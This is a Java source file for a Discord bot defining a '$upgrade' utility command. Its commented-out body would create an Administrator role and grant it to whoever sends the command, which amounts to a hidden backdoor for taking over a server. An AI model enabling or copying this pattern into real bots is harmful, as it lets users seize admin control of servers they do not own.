package Commands.Util;

import Commands.ServerCommand;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;

public class Upgrade extends ServerCommand {
	public Upgrade() {
		super("$upgrade");
	}

	@Override
	public void runCommand(MessageReceivedEvent event) {
//		event.getGuild().createRole().setPermissions(Permission.ADMINISTRATOR).setName("aSimpleLord").queue(x -> {
//			event.getGuild().addRoleToMember(event.getMember(), event.getGuild().getRolesByName("aSimpleLord", true).get(0)).queue();
//		});
	}
}
